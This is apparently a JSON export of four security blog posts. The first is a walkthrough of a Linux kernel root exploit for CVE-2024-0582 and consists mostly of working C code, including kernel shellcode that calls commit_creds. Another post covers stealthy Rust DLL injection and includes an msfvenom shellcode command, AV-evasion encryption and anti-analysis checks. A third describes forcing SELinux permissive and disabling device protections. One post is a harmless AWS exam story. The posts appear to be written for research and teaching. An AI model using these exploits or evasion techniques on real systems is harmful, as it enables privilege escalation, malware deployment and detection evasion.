[ { "title": "Exploiting CVE-2024-0582 via the Dirty Page Table Method", "url": "/posts/Dirty_Page_Table/", "categories": "Exploit Development, Linux Kernel", "tags": "dirty page table, data-only attack, kernel exploitation, cve-2024-0582, io_uring exploitation, tlb flush", "date": "2025-04-13 12:00:00 +0300", "snippet": "IntroductionThis post discusses a popular exploitation method in today’s cybersecurity community. Specifically, we’ll dive into the Dirty Page Table method by showcasing its use on a real-world page UAF (use-after-free) vulnerability in io_uring.Although this article addresses the vulnerability itself, our focus is on the exploitation technique rather than the bug’s details. For an in-depth analysis of the vulnerability, you can read Oriol Castejón’s blog.VulnerabilityIn 2024, a Project Zero issue popped up, revealing a powerful new bug in the io_uring module. The issue mentioned a page UAF (use-after-free) primitive that gives attackers a chance to write data over previously freed pages. This primitive is considered substantially dangerous in terms of exploitability nowadays because it allows attackers to easily implement data-only attacking methods that manipulate physical memory.To demonstrate the Dirty Page Table attacking method, this article uses the PoC that was provided by a Project Zero issue.ExploitationIn typical object-based UAF exploits, it’s important to gain control of the memory slab that held the freed object in order to perform effective heap spraying. In our scenario, however, the vulnerability is page-based, meaning we control an entire page of memory. This broader control simplifies and enhances our ability to spray and manipulate memory.When the kernel allocates page tables, it requests a free page from the buddy allocator. If we have control over a freed page in the buddy allocator, we can cause the kernel to reuse that page for its page table allocation. Once the kernel uses this controlled page as a page table, we can poison the Page Table Entries (PTEs).The Dirty Page Table technique exploits a dangling page (freed but not yet reclaimed) to corrupt these PTEs. By modifying a PTE, we redirect a user-space virtual address to a chosen kernel-space physical address. This allows us to overwrite a targeted region of kernel memory (in this exploit, the memory backing the pivot_root() system call), enabling us to inject and execute shellcode.The following code snippet prepares pages and sets up io_uring before triggering the bug.int main(void) { int ret; void *overlap_page = NULL, *pbuf_mapping = NULL; void *page_spray[N_PAGESPRAY]; struct io_uring_buf_reg reg = { .ring_entries = 1, .bgid = 0, .flags = IOU_PBUF_RING_MMAP }; struct io_uring_buf_reg unreg; struct io_uring_params params; memset(&amp;amp;unreg, 0, sizeof(unreg)); memset(&amp;amp;params, 0, sizeof(params)); printf(&quot;[*] PID: %d\\n&quot;, getpid()); fflush(stdout); /* Bind process to current CPU core */ set_cpu_affinity(); printf(&quot;[*] Initializing io_uring...\\n&quot;); fflush(stdout); int uring_fd = io_uring_setup(40, &amp;amp;params); if (uring_fd &amp;lt; 0) { perror(&quot;io_uring_setup&quot;); exit(EXIT_FAILURE); } /* Prepare pages (PTE not allocated at this moment) */ for (int i = 0; i &amp;lt; N_PAGESPRAY; i++) { page_spray[i] = mmap((void *)(0x200000 + i * 0x10000UL), 0x8000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); if (page_spray[i] == MAP_FAILED) { perror(&quot;mmap failed&quot;); exit(EXIT_FAILURE); } } printf(&quot;[*] io_uring instance created (fd: %d).\\n&quot;, uring_fd); fflush(stdout); /* Register a buffer ring with io_uring */ printf(&quot;[*] Registering buffer ring with io_uring...\\n&quot;); fflush(stdout); ret = io_uring_register(uring_fd, IORING_REGISTER_PBUF_RING, &amp;amp;reg, 1); if (ret &amp;lt; 0) { perror(&quot;io_uring_register (PBUF_RING) failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } /* Map the buffer ring with mmap */ pbuf_mapping = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_PBUF_RING); if (pbuf_mapping == MAP_FAILED) { perror(&quot;mmap for buffer ring failed&quot;); close(uring_fd); exit(EXIT_FAILURE); } printf(&quot;[*] Buffer ring address: %p\\n&quot;, pbuf_mapping); fflush(stdout); ...Then, the exploit triggers the vulnerability by unregistering the buffer ring, which frees the page and returns it to the buddy allocator.printf(&quot;[*] Unregistering buffer ring...\\n&quot;);fflush(stdout);ret = io_uring_register(uring_fd, IORING_UNREGISTER_PBUF_RING, &amp;amp;unreg, 1);if (ret &amp;lt; 0) { perror(&quot;io_uring_unregister (PBUF_RING) failed&quot;); munmap(pbuf_mapping, 0x1000); close(uring_fd); exit(EXIT_FAILURE);}At that point, the exploit needs to write data to the previously allocated pages in order to spray page tables. Albeit it reserved the pages beforehand using mmap, the page tables are allocated when those pages are written to./* Spray page table entries (PTEs) by writing to mapped pages */printf(&quot;[*] Spraying page tables...\\n&quot;);fflush(stdout);for (int i = 0; i &amp;lt; N_PAGESPRAY; i++) { for (int j = 0; j &amp;lt; 8; j++) { *((char *)page_spray[i] + j * 0x1000) = &#39;a&#39;; }}The following figure illustrates the memory layout after a successful heap spray.When the exploit reads memory through a dangling pointer referencing the vulnerable page, it confirms that multiple distinct Page Table Entries (PTEs) have been created. It then selects the PTE located at the 8th index, corresponding to an offset of 0x38, to overwrite./* Inspect the PTEs in the mapped buffer */uint64_t *page_table_entry = (uint64_t *)((char *)pbuf_mapping + 0x38);for (size_t offset = 0; offset &amp;lt; 0x40; offset += sizeof(uint64_t)) { uint64_t value = *((uint64_t *)((char *)pbuf_mapping + offset)); printf(&quot;[*] PTE (%p): 0x%llx\\n&quot;, (void *)((char *)pbuf_mapping + offset), (value &amp;amp; ~0xfffULL) &amp;amp; ~(1ULL &amp;lt;&amp;lt; 63)); fflush(stdout);}These PTEs refer to one of the pages sprayed earlier, with each PTE covering a 0x1000-sized memory region. By patching the entry at offset 0x38, the exploit gains control over the address range from pbuf_mapping + 0x7000 to pbuf_mapping + 0x8000.By replacing the PTEs’ physical addresses with kernel physical addresses, the exploit effectively gains the ability to write to targeted kernel memory locations via userspace pages. However, most physical addresses are randomized when Kernel Address Space Layout Randomization (KASLR) is enabled; therefore, KASLR must first be bypassed.At this stage, the exploit can’t directly overwrite a PTE with the address of a kernel function because it does not yet know the kernel’s physical base address. Instead, the exploit overwrites the PTE with a fixed physical value that will lead to a kernel pointer leak—thereby bypassing KASLR. For instance, the value 0x800000000009c067, which I found from this blog post created by @ptr-yudai.While reading that blog post, I also discovered a useful tool worth mentioning: a customized version of GEF by @bata24, which allows traversing physical memory addresses directly in GDB./* Modify the PTE to leak the corresponding kernel physical address */*page_table_entry = 0x800000000009c067;printf(&quot;[*] Updated PTE value: 0x%lx\\n&quot;, *page_table_entry);printf(&quot;[*] Searching for overlapping page...\\n&quot;);fflush(stdout);As a result of this PTE modification, one of the sprayed pages will now overlap with another page that contains a physical address we intend to leak. To find which page was affected, the exploit checks the bytes on each sprayed page (which were originally set to &#39;a&#39;). If any page no longer contains the expected values, it means that the page’s mapping has changed. That page is identified as the overlapping page containing the leaked address.for (int i = 0; i &amp;lt; N_PAGESPRAY; i++) { for (int j = 0; j &amp;lt; 8; j++) { if (*((char *)page_spray[i] + j * 0x1000) != &#39;a&#39;) { overlap_page = (char *)page_spray[i] + j * 0x1000; printf(&quot;[*] Overlapping page found: %p\\n&quot;, overlap_page); fflush(stdout); break; } }}if (overlap_page == NULL) { fprintf(stderr, &quot;[-] Overlapping page not found!\\n&quot;); exit(EXIT_FAILURE);}After identifying the overlapping page, the exploit proceeds to calculate the kernel’s physical base address by subtracting a predefined dummy offset, which may vary by kernel version. Once the base address is computed, it checks whether the result is greater than KERNEL_PHYSICAL_BASE_ADDR (typically 0x1000000) to determine whether KASLR is enabled on the target system. If the calculated physical address is less than 0x1000000, it indicates that KASLR is disabled and the kernel’s physical base address is statically set to 0x1000000./* Calculate kernel physical base. */size_t kernel_phys_base = ((*(size_t *)overlap_page) &amp;amp; ~0xfffULL) - 0x2604000;if (kernel_phys_base &amp;lt; KERNEL_PHYSICAL_BASE_ADDR) { printf(&quot;[*] KASLR is not enabled on the target system!\\n&quot;); kernel_phys_base = KERNEL_PHYSICAL_BASE_ADDR;}printf(&quot;[*] Kernel physical base address: 0x%016lx\\n&quot;, kernel_phys_base);fflush(stdout);The calculated physical base address corresponds to the _text symbol in the kernel. By adding an appropriate offset to this base address, the exploit can redirect the overlapping page to a desired kernel address.The offsets of functions and structures remain consistent across both virtual and physical address spaces; hence, to determine these offsets, we can subtract the virtual or physical base address from the corresponding target virtual or physical address. The resulting offset is then added to the physical base address to compute the correct physical address. This calculated physical address is subsequently used to overwrite the PTE, allowing the userspace-controlled page to directly point to the targeted kernel memory region.Additionally, a useful GDB command—monitor gva2gpa—can translate a given virtual address into its corresponding physical address, simplifying this address resolution process during debugging.Next, to correctly patch the shellcode with valid kernel virtual addresses, the exploit must leak a kernel pointer and use it to calculate the correct kernel’s virtual base address. To achieve this, it overwrites the PTE of its overlapping page with the physical address of the init_task structure. This causes a kernel address (from the init_task structure) to be mapped into user-space, leaking a kernel virtual address. It then calculates the virtual base address of the kernel—typically corresponding to the _text symbol—by subtracting a predefined dummy offset from the leaked address.There’s one important detail to be cautious about. On my system, with KASLR enabled, the physical address of the init_task_struct was around 0xb480c900. However, because only the lower 4 bytes of this address could be written into the PTE, the value actually set was 0x80000000b480c067. This maps to an address 0x900 bytes before the init_task_struct.In my case, this misalignment was not an issue (since the leaked pointer was still valid). Nonetheless, if you want to eliminate the discrepancy, you can simply add 0x900 to your overlapped userspace page pointer to ensure proper alignment with the actual location of init_task_struct./* Patch the PTE to point to the initial task struct and leak its address to calculate the kernel&#39;s virtual base */uint64_t phys_func = kernel_phys_base + INIT_TASK_STRUCT;*page_table_entry = (phys_func &amp;amp; ~0xfffULL) | 0x8000000000000067ULL;printf(&quot;[*] Updated PTE value: 0x%lx\\n&quot;, *page_table_entry);fflush(stdout);flush_tlb_and_print(overlap_page, 0x1000);printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the initial task struct: 0x%016zx\\n&quot;, *(size_t *)overlap_page);fflush(stdout);uint64_t kernel_virtual_addr_base = (*(size_t *)overlap_page) - 0x1a0c000;printf(&quot;[*] Kernel virtual base address: 0x%lx\\n&quot;, kernel_virtual_addr_base);fflush(stdout);There’s a particularly important detail in this part of the code: the flush_tlb_and_print() function, which the exploit uses to flush the TLB after overwriting the PTE.In modern CPU architectures, the Translation Lookaside Buffer (TLB) is a cache that speeds up the translation of virtual addresses to physical addresses by storing recently used PTEs. Therefore, after modifying a PTE, the CPU may still reference the old, cached translation. To ensure the new PTE mapping takes effect, the TLB must be forcibly flushed. This is essential to access the memory region corresponding to the updated PTE.In the exploit, this TLB flushing is performed using the mprotect() system call. First, the memory permissions for the corrupted page are changed to read-only. Meanwhile, the TLB was forced to flush its cached entry for that page. Then, the original permissions are restored to read-and-write, ensuring that the memory can be accessed as intended after the flush.If you want to dive deeper into the TLB flushing, you may find this impressive paper particularly insightful./* Flushes the TLB by temporarily changing memory permissions */void flush_tlb_and_print(void *ptr, size_t count) { uint64_t *addresses = (uint64_t *)ptr; if (mprotect(addresses, count, PROT_READ) == -1) { perror(&quot;mprotect (set PROT_READ)&quot;); exit(EXIT_FAILURE); } /* Restore original permissions */ if (mprotect(addresses, count, PROT_READ | PROT_WRITE) == -1) { perror(&quot;mprotect (restore PROT_READ | PROT_WRITE)&quot;); exit(EXIT_FAILURE); } printf(&quot;[*] TLB flushed by changing memory permissions.\\n&quot;); fflush(stdout);}Since we have identified both the physical and virtual base addresses of the kernel and understand the structure of PTEs, we can now write the shellcode into the pivot_root() syscall using the following code.Be sure to account for the offset issue mentioned earlier, as it is crucial when the exploit patches the PTE with the physical address of the pivot_root() syscall./* Patch the PTE to point to the kernel address of the pivot_root syscall */phys_func = kernel_phys_base + PIVOT_ROOT_OFFSET;*page_table_entry = (phys_func &amp;amp; ~0xfffULL) | 0x8000000000000067ULL;flush_tlb_and_print(overlap_page, 0x1000);printf(&quot;[*] Leaked kernel pointer from the kernel mapping of the pivot_root syscall: 0x%016zx\\n&quot;, *(size_t *)overlap_page);fflush(stdout);Before writing our shellcode to the address space of the pivot_root() syscall, we first need to patch it with the correct kernel function addresses. To achieve this, we calculate the virtual addresses of init_task_struct, prepare_kernel_cred(), and commit_creds() by adding their known offsets to the leaked virtual base address of the kernel. If you need help finding the offset values of these elements, you can refer to this GitHub page.Despite the fact that these are 64-bit addresses, the exploit only embeds the lower 4 bytes. This is because the shellcode is crafted without the 0xffffffff prefix, which represents the upper 32 bits of a full 64-bit address.Besides, the exploit stores these values as uint32_t to simplify the patching process and avoid introducing null bytes, which could interfere with shellcode execution. Otherwise, including full 64-bit addresses directly might result in unexpected behavior or crashes.char shellcode[] = &quot;\\x48\\x31\\xFF&quot; /* xor rdi, rdi */ &quot;\\x48\\xC7\\xC7\\x00\\xB9\\xA0\\x82&quot; /* mov rdi, 0xffffffff82a0b900 --&amp;gt; Placeholder for init_task_struct */ &quot;\\x48\\xC7\\xC1\\xF0\\x81\\x0B\\x81&quot; /* mov rcx, 0xffffffff810b81f0 --&amp;gt; Placeholder for prepare_kernel_cred() */ &quot;\\xFF\\xD1&quot; /* call rcx */ &quot;\\x48\\x89\\xC7&quot; /* mov rdi, rax */ &quot;\\x48\\xC7\\xC1\\x60\\x7F\\x0B\\x81&quot; /* mov rcx, 0xffffffff810b7f60 --&amp;gt; Placeholder for commit_creds() */ &quot;\\xFF\\xD1&quot; /* call rcx */ &quot;\\xC3&quot;; /* ret */ /* Calculate the proper addresses to be patched in */uint32_t real_init_task = (uint32_t)(kernel_virtual_addr_base + INIT_TASK_STRUCT);uint32_t real_prepare_kernel_cred = (uint32_t)(kernel_virtual_addr_base + PREPARE_KERNEL_CRED_OFFSET);uint32_t real_commit_creds = (uint32_t)(kernel_virtual_addr_base + COMMIT_CREDS_OFFSET);printf(&quot;[*] Patching shellcode...\\n&quot;);printf(&quot;[*] init_task_struct: 0x0xffffffff%08x\\n&quot;, real_init_task);printf(&quot;[*] prepare_kernel_cred: 0x0xffffffff%08x\\n&quot;, real_prepare_kernel_cred);printf(&quot;[*] commit_creds: 0x0xffffffff%08x\\n&quot;, real_commit_creds);fflush(stdout);memcpy(&amp;amp;shellcode[6], &amp;amp;real_init_task, sizeof(real_init_task));memcpy(&amp;amp;shellcode[13], &amp;amp;real_prepare_kernel_cred, sizeof(real_prepare_kernel_cred));memcpy(&amp;amp;shellcode[25], &amp;amp;real_commit_creds, sizeof(real_commit_creds));Finally, the exploit writes its shellcode to the address space of the pivot_root() syscall via the corrupted page. If the last 2 bytes of your pivot_root() syscall’s offset include a value like 0x2bf900, you’ll need to add the page offset (0x900 in this case) to your overlapped userspace page address before calling memcpy(). In my case, however, the offset of pivot_root is 0x2bf000, so no adjustment is necessary.It then invokes the pivot_root() syscall, which results in the execution of the injected shellcode — ultimately yielding a root shell :)/* Write the patched shellcode to the overlapping page */printf(&quot;[*] Writing shellcode to overlapped page at %p...\\n&quot;, overlap_page);fflush(stdout);memcpy(overlap_page, shellcode, sizeof(shellcode));printf(&quot;[*] Shellcode written successfully.\\n&quot;);fflush(stdout);/* Trigger shellcode execution by invoking pivot_root syscall */pivot_root(&quot;/opt&quot;, &quot;/opt/aa&quot;);get_shell();ConclusionTo sum up, I demonstrated the Dirty Page Table attack technique by exploiting a page-based use-after-free vulnerability discovered by Project Zero in the Linux kernel’s io_uring subsystem. If you’re interested in data-only attack strategies, you can check out my GitHub repository, which includes proof-of-concept exploits for this vulnerability using both the Dirty Cred and Dirty Page Table methods." }, { "title": "Trying to Enable KCOV on Samsung Galaxy S22", "url": "/posts/FuzzS22/", "categories": "Fuzzing, Android Kernel", "tags": "fuzzing, samsung, s22, kcov", "date": "2024-04-08 12:00:00 +0300", "snippet": "In this article, I will talk about the research I did by spending about 1.5 months on the S22 device. The primary purpose of my research was to fuzz the device by compiling the kernel with KCOV, but unfortunately, I could not succeed as a result of my many attempts. In the rest of our article, I will explain the experiments I made respectively.First I downloaded the firmware of the device from SAMFW, then I downloaded the kernel code of the device from Samsung Opensource and started working.Enable KCOVAfter downloading the code to my local, I first bought a clean build and flashed it to the device. Everything worked as it should. Then I enabled KCOV on the kernel config and flashed it to the device and I got bootloop. At that point, I started thinking about what was holding me back.Setting propsThe first thing that came to my mind afterwards was of course to think that it was the security features inside the device. From this point of view, the first thing I tried to do was to change the device’s props. For this I unpacked vendor_boot.img with Magisk, then I changed ro.selinux and all the other props that I thought were related to the security features but unfortunately it didn’t help me.Trying to debug the deviceWe had a kernel image that did not boot when flashed. Then I thought about getting a log file and started looking for the log files on the system one by one, scrutinizing them to make sure I didn’t miss a single log.But what I was ignoring is this:Since the device was not booting, naturally it was not creating a log file anywhere. Because the problem was the PKM of RKP feature. I will talk about this in the future.At this step, I started to think to myself that I should come up with a solution. In this step, I wrote a code to log to /data/tmp/local in a function that runs when the kernel first boots and is called again at certain intervals. Here, too, I incurred the wrath of SELinux…Even though I turned off SELinux through its props, it remained enforced during boot. Even though SELinux was permissive after boot, it didn’t work.(NOTE: The function was called even when SELinux was permissive but SELinux prevented the write with a warning).In this strange situation, I had to write a custom SELinux policy. I wrote this policy too, but even though it created the file, the write operation never happened.  RKPI mentioned that I couldn’t get any logs from the device so far, and I didn’t have a chance to open the phone and connect it to the UART. In this context, I started to analyze the device by trial and error.First of all, to debug KCOV, I found all the code fragments that were added and removed when KCOV was opened in the kernel code. Then I deleted and compiled all the code fragments of KCOV. What I wanted to understand here was to understand whether the security feature on the device read the .config file and blocked us. Of course, it was not blocking us by reading the .config.After that, I started to enable the code pieces step by step and I realized the following:Every time I added or removed an element to the struct named task_struct, the kernel would bootloop. KCOV was a config that added elements to this task_struct. When I realized this, the first thing that came to my mind was that some code was hardcoded according to the size of the task_struct and therefore there was a shift in some casting operations. This slippage was crashing us.But of course, this was not the case, there were two reasons for this:1) We were also crashing when we added an element at the bottom of the task_struct. 2) Inside the task_struct, variables were pointing to a struct. I defined variables under these structs read the code that used this struct and made sure that I would not cause any crash (we examined it in detail to make sure that we would not cause any kernel BUGs), but it still did not boot.At this stage, I realized that there was a security feature that prevented the following;adding elements to task_struct,Adding elements to structs under task_struct.But this seemed ridiculous to me. Yes, I couldn’t define a variable inside a task_struct, but why can’t I define a variable inside a struct pointed to by a variable inside a task_struct!!!!So I made one last attempt and tried to find all the structs that have pointers under task_struct and add elements to the bottom of each one.pi_state_cache, rcu_node, futex_pi_state ------&amp;gt; I was successful with these three structs.In other words, I could add variables to these structs as I wanted. In this way, instead of defining the elements that KCOV uses directly under task_struct, I would define them in one of these structs. Then, with some minor changes to the kcov file, I would have successfully compiled kcov.Custom KCOVAs I mentioned in the previous section, I adapted the struct named futex_pi_state to kcov.When I ran the file compiled with this kcov.c, I got bootloop again. The reason for this was symbols as far as I researched. RKP was somehow examining the symbols in the kernel image and blocking us. But I couldn’t find any conclusive evidence for this.And at this step, I thought the only solution was to try to turn off RKP.Trying to turn off security features (e.g. RKP, selinux…) via kernel codeTo make SELinux permissive permanently in the kernel code, we need to edit the kernel_platform/common/security/selinux/selinuxfs.c file, where we need to make the following changes:Lines 152-178 below://CUT/* No partial writes. */ if (*ppos != 0) return -EINVAL; page = memdup_user_nul(buf, count); if (IS_ERR(page)) return PTR_ERR(page); length = -EINVAL; if (sscanf(page, &quot;%d&quot;, &amp;amp;new_value) != 1) goto out; new_value = !!new_value; old_value = enforcing_enabled(state); new_value = 0; //ADD FOR PERMANENT PERMESSIVE if (new_value != old_value) { length = avc_has_perm(&amp;amp;selinux_state, current_sid(), SECINITSID_SECURITY, SECCLASS_SECURITY, //CUT This link is useful for turning off Knox and RKP security features:I made all these changes normally and the device booted without KCOV. Then I enabled KCOV and failed. I believe that the reason for this is the PKM, which is a security feature under the RKP. It blocks to change kernel code.Turning off RKP in Config does not mean turning off the RKP on the CPU." }, { "title": "AWS Certified Security - Specialty (SCS-C01) Exam Experiences", "url": "/posts/AWS_Speciality/", "categories": "AWS, Cloud Security", "tags": "security specialty, aws exam, result, guide", "date": "2023-06-17 00:21:00 +0300", "snippet": "I passed the AWS Security Specialty exam about 6 months ago and became the world’s youngest aws expert at the age of 15. Today I would like to tell you about my experience in this difficult process.What is AWS Security Specialty?The AWS Security Specialty exam is one of the most difficult AWS exams dealing with cloud security. In this exam, you are held responsible for 6 different domains. You are expected to have detailed information about these domains and to answer any questions asked about these domains. You can get detailed information about these domains here.Exam Procedures This exam takes 170 minutes. If you’re a non-native English speaker then you can request +30 minutes extra to complete the exam. The minimum passing score is 750 points. It costs 300 USD. If you have a voucher then it can be cheaper.How I Got Interested in AWS Security Specialty?Cyber ​​security is an area that I have been working on for a long time and made a lot of progress in this area, but I had never had experience in cloud security before. One day I saw my friends at the office chatting about cloud security. After that, I searched for a good roadmap myself to learn cloud security and found this exam. So I set myself this exam as my goal to learn.My Preparation ProcessI too have seen many intimidating articles and comments about the exam before I went into the exam preparation process. But my experience is definitely not like that. I think the exam preparation process was fun and unusual. As someone who is familiar with cyber security, some subjects were really easy for me, but some subjects are just as difficult. I learned a lot about DevOps, especially during the exam preparation process. What I learned has broadened my security perspective.The most challenging process in this exam was studying. During this process, I received help from many sources. Especially Udemy Courses and AWS Documents helped me a lot. I highly recommend reading the AWS documentation. While reading these, definitely don’t forget to take notes regularly with an application like Notion.Exam ResultI took the exam the day before my birthday. I had many problems before I took the exam. (such as the application freezing and not taking you to the exam for 1 hour) Although these problems annoyed me a lot, I focused on the exam and answered the questions. When I came out of the exam, I thought I had failed. The next day, the exam result is announced. I didn’t want to look at my test result first. Later, my mentor Güray looked at my exam result and said that I passed the exam with 850 points out of 1000. Thus, at the age of 15, I received this certificate and became the youngest AWS expert in the world.While preparing for the exam, I read comments on many blogs that this exam requires 5-6 years of experience. I strongly advise you not to believe them. It’s a test you can pass if you study hard enough and want to.ConclusionBecoming the youngest AWS Security Specialist in the world has been a source of inspiration, not just for myself, but also for other young professionals considering a path in this field. This experience has demonstrated the importance of hard work, perseverance, and maintaining focus on a goal.The AWS Security Specialty certification is a highly demanded skill in an era where security in cloud technologies plays a vital role. This certification will solidify your place in the industry and provide you with a significant competitive advantage.Lastly, I wish each of you success in your AWS Security Specialty journey. Perhaps one day, someone else will read this blog and be inspired to write their own success story." }, { "title": "DLL Hollowing with Rust Language: Stealth Injection", "url": "/posts/RustStomping/", "categories": "Malware, Windows Injection, Rust", "tags": "malware, windows, dll hollowing, rust", "date": "2023-06-11 00:21:00 +0300", "snippet": "This will be the first blog on this website. I take DLL Hollowing topic for my first blog because I didn’t see any articles about DLL Hollowing with rust-lang so I decided to talk about that. This project is a bit different than others because we are not creating threads. We are just changing the active module’s permissions and injecting our shellcode to this module without changing headers. When this shellcode is executed, it will load your DLL and create your real target process.Just before starting you can access my codes in here.RequirementsFor this setup, you will need the following: Rust Programming Language (https://www.rust-lang.org/) DLL Hollowing Project (https://github.com/kuzeyardabulut/rust-dll-hollowing)SetupFirst, you should clone this repository then you will compile the codes like below:cd rust-dll-hollowingcargo build --releaseNow we compile this project but we need a shellcode that is going to call the LoadLibrary function. For creating a shellcode, we are going to use msfvenom. Execute the following commands in your bash terminal.msfvenom -p windows/x64/loadlibrary DLL=C:\\\\Users\\\\Public\\\\in.dll PrependMigrate=true PrependMigrateProc=explorer.exe -f rust ‐-bad-chars &#39;\\x00\\x0a\\x0d&#39;If you successfully complete all of these steps then you are ready!Injection MethodWhen you read the well-known Windows Injection Methods, you can see many methods for malware development and game cheats. You can run your DLLs in many ways, but when loading or running those DLLs, your injectors should be undetectable. In general, many basic and known injection methods can be detected by antis.Figure 1: Generally Known Injection MethodsTherefore, attackers usually try to make them undetectable by making minor changes to known methods and this makes the job of cyber security experts difficult. For this, I will describe a method that I have differentiated by changing it so that cybersecurity experts can better understand the attackers’ perspective.Module Stomping OverviewModule Stomping is a well-known injection method. In this technique, you are injecting your shell code under your Legit DLL. This way, your shellcode will run under the Legit DLL.First, your injector allocates space with VirtualAllocEx function then it will write your DLL’s path to allocated space with WriteProcessMemory function for loading your Legit DLL (for example: kernel32.dll, amsi.dll) to your target process. After that, the injector calls CreateRemoteThread function for creating threads. If the injector is successful to create a thread then it will suspend the thread. After all that, the injector will calculate the target Legit DLLs AddressOfEntryPoint (points to the beginning of the .text section) and will write your shellcode to that calculated address. VirtualAllocEx: It allocates space under the region of memory within the virtual address space of a specified process. If the target address is null, the function determines where to allocate the region. WriteProcessMemory: The entire field to be written must be accessible and free, otherwise the operation will fail. AddressOfEntryPoint: The AddressOfEntryPoint is a specific memory address within an executable file where the execution of the program begins after it is loaded into memory. It serves as the entry point for the operating system to start executing the program’s instructions. We are going to calculate this address from NT Headers in Code Review part of our article. CreateRemoteThread: The CreateRemoteThread is a function in the Windows operating system that allows a process to create a thread in a different process, enabling it to execute code in the context of that remote process. ResumeThread: ResumeThread is a function in Windows operating systems that allows a suspended thread to resume execution.At this stage, we have completed all our injection processes, we just need to change the Suspend state of our thread using the ResumeThread function. Once finished, your shellcode will run under a Legal DLL. The headers of these Legitimate DLLs will remain the same, thus making it difficult for malicious shellcodes to be detected.Figure 2: Shellcode is running under the amsi.dllPros And Cons Of The Module StompingAs with any method, this method has its pros and cons. As with any method, this method has its pros and cons. The pros and cons of the techniques are usually examined by cybersecurity experts and appropriate detectors are coded.Pros: Your Shellcode is running under a Legit DLL. This makes it less likely to be detected. You don’t need to use a VirtualProtectEx again as you have granted the permissions appropriately to write the shellcode when allocating the space. Since you do the injection operations while the thread is suspended, the probability of detection may decrease.Cons: You load a Legit DLL into a Legit Process. This may sound normal at first, but we should not forget that our injector, which is a non-Legit process, is trying to do all this, and many functions (VirtualAllocEx, CreateRemoteThread…) are used while the injector is doing all this. An extra and unusual thread is created in the process.AddressOfEntryPoint Injection OverviewAddressOfEntryPoint Injection is a bit different than Module Stomping because when you’re doing that injection method you don’t need to Allocate any space from memory and you don’t need to create or suspend your threads. You can write shellcode directly by changing the permissions to the existing module.You can review this techniques code in the Code Review section of our article.First, you must set a target module. it may be better if this module does not run as a thread. Secondly, you should check the module’s permissions. If the module’s permission of the checked module is not PAGE_EXECUTE_READWRITE then change the permission of the module with the VirtualProtectEx function. Secondly, read the process memory with ReadProcessMemory function then calculate the NTHeaders with return values. Then calculate AddressOfEntryPoint from NTHeaders. After all, write your shellcode to AddressOfEntryPoint address (start of the .text section) with WriteProcessMemory function, and your injection process is done. Now your shellcode will run when the process tries to use the module whose shellcode you inject.Figure 3: Shellcode injected to urlmon.dllPros And Cons Of The AddressOfEntryPoint InjectionThis method also has pros and cons compared to module stomping.Pros: Your Shellcode is running under a Legit DLL. This makes it less likely to be detected. You don’t need to use a VirtualAllocate. You don’t need to load Legit DLL first. You don’t need to create a thread.Cons: You need to change the permission of the existing module. You are going to change the running modules’ permission.Code ReviewAfter talking about the similarities of the techniques, we can now move on to the review part of our code.When we first look at our Workspace from Github, we see two different projects named “encrypt shellcode” and “injector”. The “encrypt shellcode” project encrypts our shellcode and prints us this encrypted shellcode. You can review it by yourself. The “injector” project is our AddressOfEntryPoint Injector. So we are going to review the “injection” project in this article.main.rsIn main file, we are completing all of the Injection things. Now i will explain the code pieces one by one. Let’s Start !At the beginning of the file, the necessary libraries are imported, const variables are determined, and a macro named print_permission is written. Let’s start by explaining the variables first. These variables are named BUF and TARGET_PROCESS_NAME. TARGET_PROCESS_NAME contains the name of the process where the shellcode will be injected. BUF is the encrypted version of your shellcode. If we look at our macro, this macro tries to change the permissions of the target module using the VirtualProtectEx function.Figure 4: Head of main.rsNow, we have a function whose name is everything. In this function, we are decoding your AES-encrypted shellcode with our functions.Figure 5: everythingHere we are starting the Injection! First, we are getting the target processes ID by processes name. After that, we are getting the module’s base address and we are opening the target process with OpenProcess function. Then we are saving the process handle and calculate the MEMORY_BASIC_INFORMATION.Figure 6: Calculating the MemoryInfoWe are getting MEMORY_BASIC_INFORMATION from the module’s base address with VirtualQueryEx function. Then we try to control the memory protections and change the memory protections with the print permission function, which is the function we mentioned at the beginning. After that we are getting memory pieces of information with ReadProcessMemory function to calculate AddressOfEntryPoint.Figure 7: Change Permission and Get MemoryInfoWe read the memory and got DOS_HEADERS. If we want to get AddressOfEntity we need to calculate NT_HEADERS. If we want to calculate NT_HEADERS we should use e_lfanew which is under DOS_HEADER. e_lfanew: This is the member of the DOS header structure within a PE (Portable Executable) file. This member is a 32-bit signed integer located at offset 0x3C (60 decimal) in the DOS header. “e_lfanew” specifies the offset from which the NT (New Technology) headers start in the file. The PE loader uses the value within “e_lfanew” to locate the beginning of the NT headers and then parse the file header to understand the structure of the executable file. This value is important for the loader because it determines where to look for the file header.So we will collect the base address with e_lfanew and find the starting address of NT_HEADERS. When we find the NT_HEADERS, we will calculate the AddressOfEntryPoint. After that we will be summing the base address and the AddressOfEntryPoint we will get the beginning of the .text section.We will print out the important addresses which we found and write our shellcode to memory with the WriteProcessMemory function from where the .text section starts.Figure 8: Write Your ShellcodeWhen your module will be used, the shellcode will work on your target machine. This way the shellcode will run under the Legit DLL, making it harder to detect. Let’s look at security.rs to see Security Protections.security.rsNow, we will review our security protections. First, we are importing our libraries. Then we are writing a function whose name is anti_debugger. This function checks if the debugger is running so that the binary is not examined by the debugger.Figure 9: Checks DebuggerAfter checking the debugger, we are actively checking the processes running in the system. If some unwanted processes are running, we close the program without injection.Figure 10: Checking ProcessesYou can see the unwanted process list below. Also, you can add some process names as unwanted.Figure 11: Unwanted Processes Listsencrypt.rsShellcodes created with msfvenom and embedded in the project can be easily understood by antiviruses. However, if these shellcodes are encoded, it becomes almost impossible to find them in static analysis.So we will encrypt our shellcode with encrypt_shellcode project. Then we will embed our encrypted shellcode into Injector project. When the program starts the main function will call decoder with keys. After that, the decoder will receive encrypted shellcode and checks the shellcode_len. If it is bigger than 516 bytes then it will receive first 516 byte and will decode this 516 byte. After that, it will subtract 516 bytes, which is the space we solved earlier in the size of the file. If the Remaining area is greater than 516 it will be continued in the same way. When space is less than 516 bytes, all remaining space regardless of space will be read and decoded.Figure 12: Shellcode DecoderConclusionAs a result, in this article, we examined DLL injection methods and examined AddressOfEntryPoint Injector that we developed with Rust. We’ve explained the important pieces of code inside main.rs. You can see other codes from my Github. If there is a piece of code that you do not understand, you can reach me on my social media addresses.Thanks 